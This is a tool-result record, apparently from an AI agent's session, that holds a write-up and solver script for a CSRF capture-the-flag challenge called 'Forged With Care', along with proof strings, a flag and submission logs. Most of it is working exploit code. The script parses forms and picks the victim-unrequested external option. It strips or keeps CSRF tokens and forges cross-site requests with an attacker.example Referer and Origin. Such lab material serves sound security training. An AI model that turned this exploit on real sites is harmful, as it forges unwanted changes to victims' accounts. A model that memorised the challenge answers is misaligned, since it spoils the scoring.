{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01ThqX5mR7NjqMcEzSzgqDaU","type":"tool_result","content":"# Day 22 web — Forged With Care (CSRF)\n\nDerived answers (from the live workers' logs; the targets are now 410 `{\"state\":\"completed\"}`):\n- single_solve (e1a79165): proof-1 = proof_d7ca4db36ad249db96741ac9f75eb854 (GM CORRECT)\n- time_trial 1650d5ed: proof-1 = proof_fda7dd0cde44472f925389a17155b017 (GM CORRECT, live worker)\n\nConstruct: `/api/clues` -> `{\"feature_route\":\"/submit-<hex6>\",\"preferences_route\":\"/preferences\",...}`. GET `/` sets\n`arena_session`; `/preferences` has `<form method='get' action='/submit-..'>` with `<select name=destination>`\n(`daily` + `review-NNNN@outside.example.invalid`) and hidden `csrf_token` (= session value). A same-site submit gives\n`changed_across_sites:false`. The same request with `Sec-Fetch-Site: cross-site` (+ Mode/Dest navigate/document and a\nforeign Referer) makes `/api/preferences` return `evidence: proof_<hex>`. The token is optional (the single used no\ntoken, the TT included it).\n\nSpeed fix: the old solve.py was only the generic `lib.web` race (no CSRF handler). It ran 41 s and missed. Now\n`csrf()` parses the form generically: every form on each clue-named page, GET/POST per the form, non-current external\noption first, with the token / without it / swapped method. It needs about 5 requests (~1 s). `lib.web.solve_target`\nruns only if that misses AND the home page is alive (2xx/3xx). Expired targets exit in about 1 s.\n`answer()` stays self-contained (lib.web races every web solver's answer(); it must not call back into lib.web).\n\nVARIANT AXIS: TT vs single differ only in the route hex (`/submit-<hex6>`), the mailbox number and whether csrf_token\nis sent -- parse the form (action/method/select/hidden) from the clue-named page and send it as a cross-site\nnavigation, never hard-code the route.\n\n## Proposed lib additions\n- lib/web/handlers: a `csrf` handler (port `csrf()` from this solve.py), keyed on clue keys `preferences_route` /\n  `browser_session`, or any page with a `<form>` holding a `csrf|token` hidden input. Headers: Sec-Fetch-Site cross-site,\n  Sec-Fetch-Mode navigate, Sec-Fetch-Dest document, a foreign Referer (and Origin for POST).\n- lib.web.solve_target: skip the 40 s race when GET base returns a non-2xx/3xx status (expired target = 410\n  `{\"state\":\"completed\"}`); that alone is what made dead-target runs take ~9-40 s.\n#!/usr/bin/env python3\n\"\"\"Day-22 web \"Forged With Care\" (CSRF) -- direct probe first, then the generic lib.web race as the fallback.\n\n    solve.py --contract <contract.json> --artifacts <dir>   ->  {answer_id: proof} JSON on the last line\n\nConstruct (single + TT): /api/clues names `feature_route` (/submit-<hex6>) and `preferences_route` (/preferences). The\npreferences page carries a `<form method=get action=/submit-..>` with a `<select name=destination>` (current value +\nan external mailbox) and a hidden `csrf_token` equal to the arena_session cookie. Submitting the change same-site\nrecords `changed_across_sites:false`; the SAME request sent as a cross-site navigation (Sec-Fetch-Site: cross-site,\nforeign Referer) makes /api/preferences return `evidence: proof_<hex>`. ~5 requests -- the generic lib.web race (every\nearlier solver x the default ladder) took 41 s and found nothing, so it now runs ONLY when this probe misses (a\ncompounded Mastery target of an earlier class), and not at all when the target is gone (4xx/5xx on every recon URL).\"\"\"\nimport json\nimport re\nimport sys\nimport threading\nimport urllib.parse\nfrom pathlib import Path\n\nROOT = Path(__file__).resolve().parents[4]\nsys.path.insert(0, str(ROOT))\nfrom lib import solverrt, websolve  # noqa: E402\n\nXSITE = {\"Sec-Fetch-Site\": \"cross-site\", \"Sec-Fetch-Mode\": \"navigate\", \"Sec-Fetch-Dest\": \"document\",\n         \"Sec-Fetch-User\": \"?1\", \"Referer\": \"https://attacker.example/forged.html\"}\nATTR = r\"\"\"\\b{}\\s*=\\s*(?:\"([^\"]*)\"|'([^']*)'|([^\\s>]+))\"\"\"\n\n\ndef _attr(tag, name):\n    m = re.search(ATTR.format(name), tag, re.I)\n    return next((g for g in m.groups() if g is not None), \"\") if m else None\n\n\nclass _Session:\n    \"\"\"Tiny cookie jar over websolve.fetch (keeps the victim's arena_session across the recon and the forged hit).\"\"\"\n\n    def __init__(self, base):\n        self.base, self.jar = base, {}\n\n    def get(self, path, headers=None, data=None, method=None):\n        h = dict(headers or {})\n        if self.jar:\n            h[\"Cookie\"] = \"; \".join(f\"{k}={v}\" for k, v in self.jar.items())\n        st, body, sc = websolve.fetch(urllib.parse.urljoin(self.base, path), h, data=data, method=method)\n        for c in sc:\n            k, _, v = c.split(\";\", 1)[0].partition(\"=\")\n            if k.strip():\n                self.jar.setdefault(k.strip(), v.strip())\n        return st, body\n\n\ndef _forms(html):\n    \"\"\"[(method, action, fields{name: value}, choices{name: [option values]})] for every <form> in the page.\"\"\"\n    out = []\n    for m in re.finditer(r\"<form\\b([^>]*)>(.*?)</form>\", html, re.I | re.S):\n        tag, inner = m.groups()\n        fields, choices = {}, {}\n        for s in re.finditer(r\"<select\\b([^>]*)>(.*?)</select>\", inner, re.I | re.S):\n            name = _attr(s.group(1), \"name\")\n            if name:\n                opts = [_attr(o, \"value\") for o in re.findall(r\"<option\\b[^>]*>\", s.group(2), re.I)]\n                choices[name] = [o for o in opts if o is not None]\n        for i in re.findall(r\"<(?:input|textarea|button)\\b[^>]*>\", inner, re.I):\n            name = _attr(i, \"name\")\n            if name and (_attr(i, \"type\") or \"\").lower() not in (\"submit\", \"button\", \"reset\"):\n                fields[name] = _attr(i, \"value\") or \"\"\n        out.append(((_attr(tag, \"method\") or \"get\").lower(), _attr(tag, \"action\") or \"\", fields, choices))\n    return out\n\n\ndef _state_routes(html, clues):\n    \"\"\"Where the app shows the saved state: /api/* links on the form page, then /api/* values in the clues.\"\"\"\n    links = re.findall(r\"\"\"href\\s*=\\s*[\"'](/api/[^\"'#]+)[\"']\"\"\", html, re.I)\n    links += [v for v in clues.values() if isinstance(v, str) and v.startswith(\"/api/\") and v != \"/api/clues\"]\n    return list(dict.fromkeys(links))\n\n\ndef csrf(base, clues=None):\n    \"\"\"Proof for one CSRF target (see module doc), or None when the target shows no forgeable state-changing form.\"\"\"\n    s = _Session(base)\n    if clues is None:\n        res = {}\n        t = threading.Thread(target=lambda: res.update(c=websolve.fetch(urllib.parse.urljoin(base, \"/api/clues\"))))\n        t.start()\n        s.get(\"/\")                                     # plants the victim session cookie\n        t.join()\n        try:\n            clues = json.loads(res[\"c\"][1])\n        except (ValueError, TypeError, KeyError):\n            clues = {}\n    clues = clues if isinstance(clues, dict) else {}\n    action_route = clues.get(\"feature_route\")\n    pages = [v for k, v in clues.items() if isinstance(v, str) and re.fullmatch(r\"/[\\w./-]*\", v)\n             and v != action_route and not v.startswith(\"/api/\")]\n    for page in pages + ([action_route] if action_route else []):\n        st, html = s.get(page)\n        p = websolve.proof(html)\n        if p:\n            return p\n        for method, action, fields, choices in _forms(html):\n            if not choices and not fields:\n                continue\n            action = action or page\n            cur = re.search(r\"(?:current|saved)[^<]*:\\s*(?:<[^>]+>\\s*)*([^<\\s][^<]*)\", html, re.I)\n            cur = cur.group(1).strip() if cur else None\n            # the change the victim never asked for: a non-current option, the external/foreign one first\n            alts = {}\n            for name, opts in choices.items():\n                cand = sorted(opts, key=lambda o: (o == cur, not re.search(r\"@|extern|outside|attacker|admin|review\",\n                                                                           o, re.I)))\n                alts[name] = cand\n            n = max((len(v) for v in alts.values()), default=1)\n            hidden = [k for k in fields if re.search(r\"csrf|token|nonce|xsrf\", k, re.I)]\n            for i in range(n):\n                base_form = dict(fields)\n                for name, cand in alts.items():\n                    base_form[name] = cand[min(i, len(cand) - 1)]\n                no_tok = {k: v for k, v in base_form.items() if k not in hidden}\n                for form, meth in ((base_form, method), (no_tok, method),\n                                   (base_form, \"post\" if method == \"get\" else \"get\")):\n                    if meth == \"post\":\n                        hdr = dict(XSITE, Origin=\"https://attacker.example\")\n                        st, body = s.get(action, hdr, data=form, method=\"POST\")\n                    else:\n                        q = urllib.parse.urlencode(form)\n                        st, body = s.get(f\"{action}{'&' if '?' in action else '?'}{q}\", XSITE)\n                    p = websolve.proof(body)\n                    if p:\n                        return p\n                    if not 200 <= st < 300:\n                        continue\n                    for r in _state_routes(html, clues):\n                        p = websolve.proof(s.get(r)[1])\n                        if p:\n                            return p\n    return None\n\n\ndef answer(answer_id, question, data, contract):\n    \"\"\"Self-contained CSRF probe (lib.web races every web solver's answer(): this must NOT call back into it).\"\"\"\n    base = websolve.base_of(question, contract)\n    return csrf(base) if base else None\n\n\ndef _solve_one(job):\n    aid, q, contract = job\n    base = websolve.base_of(q, contract)\n    if not base:\n        return {}\n    p = csrf(base)\n    if p:\n        return {aid: p}\n    if not 200 <= websolve.fetch(base)[0] < 400:      # expired target (410 {\"state\":\"completed\"}) / unreachable\n        return {}\n    from lib import web                               # compounded earlier-day class: the generic race\n    p = web.solve_target(q, contract)\n    return {aid: p} if p else {}\n\n\ndef main():\n    import argparse\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--contract\", required=True)\n    ap.add_argument(\"--artifacts\", required=False)\n    a = ap.parse_args()\n    contract = json.loads(Path(a.contract).read_text())\n    ids = contract.get(\"answer_ids\") or [q.get(\"id\") for q in contract.get(\"questions\", [])]\n    qs = contract.get(\"questions\", [])\n    jobs = [(aid, qs[i] if i < len(qs) else {}, contract) for i, aid in enumerate(ids)]\n    out, pool = {}, []\n    solverrt.arm_deadline(out, pool)\n    solverrt.run_sets(jobs, _solve_one, out, pool, io_bound=True)\n    solverrt.emit_and_exit(out, pool)\n\n\nif __name__ == \"__main__\":\n    main()\n{\n  \"e1a79165-f2d4-4bb5-821f-874ff654b80e\": {\n    \"proof-1\": \"proof_d7ca4db36ad249db96741ac9f75eb854\"\n  }\n}{\"ts\": \"20261022T130136Z\", \"attempt\": \"e1a79165-f2d4-4bb5-821f-874ff654b80e\", \"answers\": {\"proof-1\": \"proof_d7ca4db36ad249db96741ac9f75eb854\"}, \"http\": 200, \"kind\": \"correct\", \"confirmed\": [\"proof-1\"], \"body\": {\"result\": \"CORRECT\", \"solved_by\": {\"name\": \"_blackb3ard\", \"at\": \"2026-10-22T13:01:33.871Z\"}, \"name\": \"🌐 Forged With Care\", \"flag\": \"4a2627113a9fa203b8e561549cdb553f\"}, \"transport\": \"homebase\", \"elapsed\": 3.41}\nmastery:\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nprofile.txt\nsubmissions.jsonl\nworker-generalize-local-20261022T210329.log\n\nsingle_solve:\nartifacts\nconfirmed.json\ncontract.json\ninbox.jsonl\nlog.jsonl\nrace_bisect.json\nstart.json\nsubmissions.jsonl\ntriage.md\nworker-live-answer-first-20261022T210050.log\nworker-single-duel-20261022T210055.log\nworker-single-duel2-20261022T210055.log\nworker-single-local-20261022T210021.log\n\nsolver/cases:\nauto-mastery-7abe728c\nsingle_solve\ntime_trial-1650d5ed\nvariant-time_trial-1650d5ed\n\ntime_trial:\nattempts\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nstart.json\nsubmissions.jsonl\nworker-generalize-duel-20261022T210327.log\nworker-generalize-local-20261022T210239.log\nworker-live-local-20261022T210233.log","is_error":false}]},"parent_tool_use_id":null,"session_id":"0e761320-118b-4e21-b38e-4dfe6997f088","uuid":"7d13d21b-35f8-4856-8c23-ab9279ff1878","timestamp":"2026-10-22T13:09:46.979Z","tool_use_result":{"stdout":"# Day 22 web — Forged With Care (CSRF)\n\nDerived answers (from the live workers' logs; the targets are now 410 `{\"state\":\"completed\"}`):\n- single_solve (e1a79165): proof-1 = proof_d7ca4db36ad249db96741ac9f75eb854 (GM CORRECT)\n- time_trial 1650d5ed: proof-1 = proof_fda7dd0cde44472f925389a17155b017 (GM CORRECT, live worker)\n\nConstruct: `/api/clues` -> `{\"feature_route\":\"/submit-<hex6>\",\"preferences_route\":\"/preferences\",...}`. GET `/` sets\n`arena_session`; `/preferences` has `<form method='get' action='/submit-..'>` with `<select name=destination>`\n(`daily` + `review-NNNN@outside.example.invalid`) and hidden `csrf_token` (= session value). A same-site submit gives\n`changed_across_sites:false`. The same request with `Sec-Fetch-Site: cross-site` (+ Mode/Dest navigate/document and a\nforeign Referer) makes `/api/preferences` return `evidence: proof_<hex>`. The token is optional (the single used no\ntoken, the TT included it).\n\nSpeed fix: the old solve.py was only the generic `lib.web` race (no CSRF handler). It ran 41 s and missed. Now\n`csrf()` parses the form generically: every form on each clue-named page, GET/POST per the form, non-current external\noption first, with the token / without it / swapped method. It needs about 5 requests (~1 s). `lib.web.solve_target`\nruns only if that misses AND the home page is alive (2xx/3xx). Expired targets exit in about 1 s.\n`answer()` stays self-contained (lib.web races every web solver's answer(); it must not call back into lib.web).\n\nVARIANT AXIS: TT vs single differ only in the route hex (`/submit-<hex6>`), the mailbox number and whether csrf_token\nis sent -- parse the form (action/method/select/hidden) from the clue-named page and send it as a cross-site\nnavigation, never hard-code the route.\n\n## Proposed lib additions\n- lib/web/handlers: a `csrf` handler (port `csrf()` from this solve.py), keyed on clue keys `preferences_route` /\n  `browser_session`, or any page with a `<form>` holding a `csrf|token` hidden input. Headers: Sec-Fetch-Site cross-site,\n  Sec-Fetch-Mode navigate, Sec-Fetch-Dest document, a foreign Referer (and Origin for POST).\n- lib.web.solve_target: skip the 40 s race when GET base returns a non-2xx/3xx status (expired target = 410\n  `{\"state\":\"completed\"}`); that alone is what made dead-target runs take ~9-40 s.\n#!/usr/bin/env python3\n\"\"\"Day-22 web \"Forged With Care\" (CSRF) -- direct probe first, then the generic lib.web race as the fallback.\n\n    solve.py --contract <contract.json> --artifacts <dir>   ->  {answer_id: proof} JSON on the last line\n\nConstruct (single + TT): /api/clues names `feature_route` (/submit-<hex6>) and `preferences_route` (/preferences). The\npreferences page carries a `<form method=get action=/submit-..>` with a `<select name=destination>` (current value +\nan external mailbox) and a hidden `csrf_token` equal to the arena_session cookie. Submitting the change same-site\nrecords `changed_across_sites:false`; the SAME request sent as a cross-site navigation (Sec-Fetch-Site: cross-site,\nforeign Referer) makes /api/preferences return `evidence: proof_<hex>`. ~5 requests -- the generic lib.web race (every\nearlier solver x the default ladder) took 41 s and found nothing, so it now runs ONLY when this probe misses (a\ncompounded Mastery target of an earlier class), and not at all when the target is gone (4xx/5xx on every recon URL).\"\"\"\nimport json\nimport re\nimport sys\nimport threading\nimport urllib.parse\nfrom pathlib import Path\n\nROOT = Path(__file__).resolve().parents[4]\nsys.path.insert(0, str(ROOT))\nfrom lib import solverrt, websolve  # noqa: E402\n\nXSITE = {\"Sec-Fetch-Site\": \"cross-site\", \"Sec-Fetch-Mode\": \"navigate\", \"Sec-Fetch-Dest\": \"document\",\n         \"Sec-Fetch-User\": \"?1\", \"Referer\": \"https://attacker.example/forged.html\"}\nATTR = r\"\"\"\\b{}\\s*=\\s*(?:\"([^\"]*)\"|'([^']*)'|([^\\s>]+))\"\"\"\n\n\ndef _attr(tag, name):\n    m = re.search(ATTR.format(name), tag, re.I)\n    return next((g for g in m.groups() if g is not None), \"\") if m else None\n\n\nclass _Session:\n    \"\"\"Tiny cookie jar over websolve.fetch (keeps the victim's arena_session across the recon and the forged hit).\"\"\"\n\n    def __init__(self, base):\n        self.base, self.jar = base, {}\n\n    def get(self, path, headers=None, data=None, method=None):\n        h = dict(headers or {})\n        if self.jar:\n            h[\"Cookie\"] = \"; \".join(f\"{k}={v}\" for k, v in self.jar.items())\n        st, body, sc = websolve.fetch(urllib.parse.urljoin(self.base, path), h, data=data, method=method)\n        for c in sc:\n            k, _, v = c.split(\";\", 1)[0].partition(\"=\")\n            if k.strip():\n                self.jar.setdefault(k.strip(), v.strip())\n        return st, body\n\n\ndef _forms(html):\n    \"\"\"[(method, action, fields{name: value}, choices{name: [option values]})] for every <form> in the page.\"\"\"\n    out = []\n    for m in re.finditer(r\"<form\\b([^>]*)>(.*?)</form>\", html, re.I | re.S):\n        tag, inner = m.groups()\n        fields, choices = {}, {}\n        for s in re.finditer(r\"<select\\b([^>]*)>(.*?)</select>\", inner, re.I | re.S):\n            name = _attr(s.group(1), \"name\")\n            if name:\n                opts = [_attr(o, \"value\") for o in re.findall(r\"<option\\b[^>]*>\", s.group(2), re.I)]\n                choices[name] = [o for o in opts if o is not None]\n        for i in re.findall(r\"<(?:input|textarea|button)\\b[^>]*>\", inner, re.I):\n            name = _attr(i, \"name\")\n            if name and (_attr(i, \"type\") or \"\").lower() not in (\"submit\", \"button\", \"reset\"):\n                fields[name] = _attr(i, \"value\") or \"\"\n        out.append(((_attr(tag, \"method\") or \"get\").lower(), _attr(tag, \"action\") or \"\", fields, choices))\n    return out\n\n\ndef _state_routes(html, clues):\n    \"\"\"Where the app shows the saved state: /api/* links on the form page, then /api/* values in the clues.\"\"\"\n    links = re.findall(r\"\"\"href\\s*=\\s*[\"'](/api/[^\"'#]+)[\"']\"\"\", html, re.I)\n    links += [v for v in clues.values() if isinstance(v, str) and v.startswith(\"/api/\") and v != \"/api/clues\"]\n    return list(dict.fromkeys(links))\n\n\ndef csrf(base, clues=None):\n    \"\"\"Proof for one CSRF target (see module doc), or None when the target shows no forgeable state-changing form.\"\"\"\n    s = _Session(base)\n    if clues is None:\n        res = {}\n        t = threading.Thread(target=lambda: res.update(c=websolve.fetch(urllib.parse.urljoin(base, \"/api/clues\"))))\n        t.start()\n        s.get(\"/\")                                     # plants the victim session cookie\n        t.join()\n        try:\n            clues = json.loads(res[\"c\"][1])\n        except (ValueError, TypeError, KeyError):\n            clues = {}\n    clues = clues if isinstance(clues, dict) else {}\n    action_route = clues.get(\"feature_route\")\n    pages = [v for k, v in clues.items() if isinstance(v, str) and re.fullmatch(r\"/[\\w./-]*\", v)\n             and v != action_route and not v.startswith(\"/api/\")]\n    for page in pages + ([action_route] if action_route else []):\n        st, html = s.get(page)\n        p = websolve.proof(html)\n        if p:\n            return p\n        for method, action, fields, choices in _forms(html):\n            if not choices and not fields:\n                continue\n            action = action or page\n            cur = re.search(r\"(?:current|saved)[^<]*:\\s*(?:<[^>]+>\\s*)*([^<\\s][^<]*)\", html, re.I)\n            cur = cur.group(1).strip() if cur else None\n            # the change the victim never asked for: a non-current option, the external/foreign one first\n            alts = {}\n            for name, opts in choices.items():\n                cand = sorted(opts, key=lambda o: (o == cur, not re.search(r\"@|extern|outside|attacker|admin|review\",\n                                                                           o, re.I)))\n                alts[name] = cand\n            n = max((len(v) for v in alts.values()), default=1)\n            hidden = [k for k in fields if re.search(r\"csrf|token|nonce|xsrf\", k, re.I)]\n            for i in range(n):\n                base_form = dict(fields)\n                for name, cand in alts.items():\n                    base_form[name] = cand[min(i, len(cand) - 1)]\n                no_tok = {k: v for k, v in base_form.items() if k not in hidden}\n                for form, meth in ((base_form, method), (no_tok, method),\n                                   (base_form, \"post\" if method == \"get\" else \"get\")):\n                    if meth == \"post\":\n                        hdr = dict(XSITE, Origin=\"https://attacker.example\")\n                        st, body = s.get(action, hdr, data=form, method=\"POST\")\n                    else:\n                        q = urllib.parse.urlencode(form)\n                        st, body = s.get(f\"{action}{'&' if '?' in action else '?'}{q}\", XSITE)\n                    p = websolve.proof(body)\n                    if p:\n                        return p\n                    if not 200 <= st < 300:\n                        continue\n                    for r in _state_routes(html, clues):\n                        p = websolve.proof(s.get(r)[1])\n                        if p:\n                            return p\n    return None\n\n\ndef answer(answer_id, question, data, contract):\n    \"\"\"Self-contained CSRF probe (lib.web races every web solver's answer(): this must NOT call back into it).\"\"\"\n    base = websolve.base_of(question, contract)\n    return csrf(base) if base else None\n\n\ndef _solve_one(job):\n    aid, q, contract = job\n    base = websolve.base_of(q, contract)\n    if not base:\n        return {}\n    p = csrf(base)\n    if p:\n        return {aid: p}\n    if not 200 <= websolve.fetch(base)[0] < 400:      # expired target (410 {\"state\":\"completed\"}) / unreachable\n        return {}\n    from lib import web                               # compounded earlier-day class: the generic race\n    p = web.solve_target(q, contract)\n    return {aid: p} if p else {}\n\n\ndef main():\n    import argparse\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--contract\", required=True)\n    ap.add_argument(\"--artifacts\", required=False)\n    a = ap.parse_args()\n    contract = json.loads(Path(a.contract).read_text())\n    ids = contract.get(\"answer_ids\") or [q.get(\"id\") for q in contract.get(\"questions\", [])]\n    qs = contract.get(\"questions\", [])\n    jobs = [(aid, qs[i] if i < len(qs) else {}, contract) for i, aid in enumerate(ids)]\n    out, pool = {}, []\n    solverrt.arm_deadline(out, pool)\n    solverrt.run_sets(jobs, _solve_one, out, pool, io_bound=True)\n    solverrt.emit_and_exit(out, pool)\n\n\nif __name__ == \"__main__\":\n    main()\n{\n  \"e1a79165-f2d4-4bb5-821f-874ff654b80e\": {\n    \"proof-1\": \"proof_d7ca4db36ad249db96741ac9f75eb854\"\n  }\n}{\"ts\": \"20261022T130136Z\", \"attempt\": \"e1a79165-f2d4-4bb5-821f-874ff654b80e\", \"answers\": {\"proof-1\": \"proof_d7ca4db36ad249db96741ac9f75eb854\"}, \"http\": 200, \"kind\": \"correct\", \"confirmed\": [\"proof-1\"], \"body\": {\"result\": \"CORRECT\", \"solved_by\": {\"name\": \"_blackb3ard\", \"at\": \"2026-10-22T13:01:33.871Z\"}, \"name\": \"🌐 Forged With Care\", \"flag\": \"4a2627113a9fa203b8e561549cdb553f\"}, \"transport\": \"homebase\", \"elapsed\": 3.41}\nmastery:\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nprofile.txt\nsubmissions.jsonl\nworker-generalize-local-20261022T210329.log\n\nsingle_solve:\nartifacts\nconfirmed.json\ncontract.json\ninbox.jsonl\nlog.jsonl\nrace_bisect.json\nstart.json\nsubmissions.jsonl\ntriage.md\nworker-live-answer-first-20261022T210050.log\nworker-single-duel-20261022T210055.log\nworker-single-duel2-20261022T210055.log\nworker-single-local-20261022T210021.log\n\nsolver/cases:\nauto-mastery-7abe728c\nsingle_solve\ntime_trial-1650d5ed\nvariant-time_trial-1650d5ed\n\ntime_trial:\nattempts\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nstart.json\nsubmissions.jsonl\nworker-generalize-duel-20261022T210327.log\nworker-generalize-local-20261022T210239.log\nworker-live-local-20261022T210233.log","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false},"tool_result_meta":[{"id":"toolu_01ThqX5mR7NjqMcEzSzgqDaU","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
